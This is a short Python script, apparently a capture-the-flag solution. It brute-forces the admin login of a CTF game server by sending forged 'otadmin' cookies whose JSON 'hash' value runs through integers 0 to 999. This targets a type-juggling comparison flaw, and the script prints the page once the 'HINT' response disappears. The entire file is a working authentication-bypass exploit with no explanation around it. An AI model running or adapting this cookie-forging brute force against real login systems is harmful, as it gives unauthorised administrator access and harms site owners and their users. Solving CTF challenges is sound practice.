import requests

url = 'https://gameserver.zajebistyc.tf/admin/login.php'
s = requests.Session()
for i in range(1000):
    r = s.get(url, cookies={'otadmin': '{"hash": ' + str(i) + '}'})
    if 'HINT' not in str(r.content):
        print(str(r.content))
        break
